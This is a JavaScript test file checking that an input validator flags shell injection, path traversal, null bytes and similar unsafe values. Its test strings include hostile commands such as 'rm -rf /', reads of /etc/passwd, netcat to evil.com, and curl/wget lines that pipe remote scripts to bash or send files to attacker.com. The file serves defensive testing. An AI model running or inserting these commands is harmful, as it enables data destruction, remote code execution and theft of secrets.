/**
 * specs/shell.spec.js
 *
 * Tests for the SHELL injection and path traversal context patterns.
 */

import { isUnsafe, SHELL } from '../src/index.js';

const unsafe = (v) => expect(isUnsafe(v, SHELL)).toBe(true,  `expected UNSAFE: ${v}`);
const safe   = (v) => expect(isUnsafe(v, SHELL)).toBe(false, `expected SAFE:   ${v}`);

describe('SHELL context — path traversal', () => {
  it('flags Unix ../ traversal', () => {
    unsafe('../etc/passwd');
    unsafe('../../etc/shadow');
    unsafe('images/../../../etc/passwd');
    unsafe('./subdir/../../../secret');
  });

  it('flags Windows ..\\ traversal', () => {
    unsafe('..\\windows\\system32');
    unsafe('..\\..\\secret.txt');
  });

  it('flags URL-encoded traversal', () => {
    unsafe('%2e%2e/etc/passwd');
    unsafe('%2e%2e%2fetc%2fpasswd');
    unsafe('../%2fetc');
  });

  it('does not flag a single dot or double dot without slash', () => {
    safe('version 1.2.3');
    safe('file.txt');
    safe('3.14');
    safe('.hidden-file');
    safe('..');       // two dots, no slash after
  });

  it('does not flag relative paths without traversal', () => {
    safe('images/photo.jpg');
    safe('docs/readme.md');
    safe('subdir/file.txt');
    // Note: /absolute/paths are flagged by the shell-absolute-root rule (intentional)
  });
});

describe('SHELL context — null byte injection', () => {
  it('flags null byte \\x00', () => {
    unsafe('file.txt\x00.jpg');
    unsafe('\x00');
    unsafe('value\x00extra');
  });

  it('flags URL-encoded null byte %00', () => {
    unsafe('file.txt%00.jpg');
    unsafe('path%00../etc/passwd');
  });
});

describe('SHELL context — command separators', () => {
  it('flags semicolons', () => {
    unsafe('filename; rm -rf /');
    unsafe('value; cat /etc/passwd');
    unsafe('; ls -la');
  });

  it('flags pipe operator', () => {
    unsafe('input | cat /etc/passwd');
    unsafe('value|evil');
    unsafe('data | nc evil.com 4444');
  });

  it('flags && AND operator', () => {
    unsafe('value && evil');
    unsafe('true && cat /etc/passwd');
    unsafe('x&&y');
  });

  it('flags || OR operator', () => {
    unsafe('false || evil');
    unsafe('cmd||cat /etc/passwd');
  });
});

describe('SHELL context — command substitution', () => {
  it('flags backtick substitution', () => {
    unsafe('`whoami`');
    unsafe('value`cat /etc/passwd`');
    unsafe('`id`');
  });

  it('flags $() substitution', () => {
    unsafe('$(whoami)');
    unsafe('value$(cat /etc/passwd)');
    unsafe('$(id)');
  });

  it('flags ${} variable expansion', () => {
    unsafe('${HOME}');
    unsafe('${PATH}');
    unsafe('prefix${IFS}suffix');
  });
});

describe('SHELL context — redirection operators', () => {
  it('flags output redirection >', () => {
    unsafe('value > /tmp/out.txt');
    unsafe('cmd >> /var/log/evil.log');
  });

  it('flags input redirection <', () => {
    unsafe('cmd < /etc/passwd');
    unsafe('value<file');
  });
});

describe('SHELL context — newline injection', () => {
  it('flags newline characters', () => {
    unsafe("value\nevil");
    unsafe("value\revil");
    unsafe("line1\nline2");
  });
});

describe('SHELL context — absolute and Windows paths', () => {
  it('flags strings starting with /', () => {
    unsafe('/etc/passwd');
    unsafe('/bin/sh');
    unsafe('/var/www/html/index.php');
  });

  it('flags Windows UNC paths starting with \\\\', () => {
    unsafe('\\\\server\\share');
    unsafe('\\\\evil.com\\c$');
  });

  it('flags Windows drive letter paths', () => {
    unsafe('C:\\Windows\\System32\\cmd.exe');
    unsafe('D:/secret/file.txt');
    unsafe('c:/windows/system32');
  });

  it('does not flag relative paths without traversal', () => {
    safe('images/photo.jpg');
    safe('docs/readme.md');
    safe('subdir/file.txt');
  });
});

describe('SHELL context — glob expansion', () => {
  it('flags glob after path separator', () => {
    unsafe('/tmp/*');
    unsafe('dir/*');
    unsafe('/etc/*.conf');
    unsafe('path/?ile');
  });

  it('does not flag * or ? in other positions', () => {
    safe('hello world');
    safe('2 * 3 = 6');        // multiplication — no path separator
    safe('is this ok?');      // question mark — no path separator
    safe('100%');
  });
});

describe('SHELL context — curl/wget exfiltration', () => {
  it('flags curl command', () => {
    unsafe('curl http://evil.com/shell.sh | bash');
    unsafe('curl -s https://attacker.com/?data=$(cat /etc/passwd)');
  });

  it('flags wget command', () => {
    unsafe('wget http://evil.com/malware');
    unsafe('wget -O- http://evil.com/script | sh');
  });

  it('does not flag the word curl or wget without a URL or flag', () => {
    safe('curl is a command-line tool');   // no URL/flag follows
    safe('I use wget to download files'); // no URL/flag follows
  });
});

describe('SHELL context — safe strings', () => {
  it('passes typical filename values', () => {
    safe('document.pdf');
    safe('image-2024.jpg');
    safe('report_final.xlsx');
    safe('my file.txt');
  });

  it('passes typical text values', () => {
    safe('Hello World');
    safe('user@example.com');
    safe('John O\'Brien');
    safe('The quick brown fox');
  });

  it('passes alphanumeric identifiers', () => {
    safe('user123');
    safe('SKU-1234-AB');
    safe('2024-01-15T10:30:00Z');
  });

  it('passes URLs', () => {
    safe('https://example.com/path?q=hello');
    safe('https://api.example.com/v1/users');
  });
});
